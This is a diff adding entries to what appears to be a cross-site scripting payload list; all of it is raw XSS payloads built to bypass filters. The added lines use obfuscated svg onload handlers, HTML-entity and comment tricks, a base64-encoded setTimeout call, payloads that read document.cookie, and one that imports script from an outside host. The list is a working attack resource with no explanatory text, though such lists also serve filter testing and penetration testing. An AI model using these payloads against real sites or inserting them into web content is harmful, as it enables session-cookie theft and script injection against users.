@@ -6,3 +6,13 @@
 <Svg Only=1 OnLoad=confirm(1)>
 "aaa<a href=javas&#99;ript:alert(1)>click"
 "><<x>img/src/onerror=alert(document.cookie)>
+<svg/onload=alert/*1337*/(1)>
+<svg/onload=alert//&NewLine;(2)>
+<svg/onload=alert&sol;**&sol;(3)>
+<svg/onload=alert/&#42;&#42;/(4)>
+<svg/onload=alert&#x2F;**&#47;(5)>
+<details x=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:2 open ontoggle="prompt(document.cookie);">
+<Img Src=OnXSS OnError=alert(1)>
+<Img Src=//X55.is OnLoad%0C=import(Src)//
+<A AutoFocus HRef %252F=""OnFocus=top/**/?.['al'%2B'ert'](1)>
+<img/src/onerror=setTimeout(atob(/YWxlcnQoMTMzNyk/.source))>
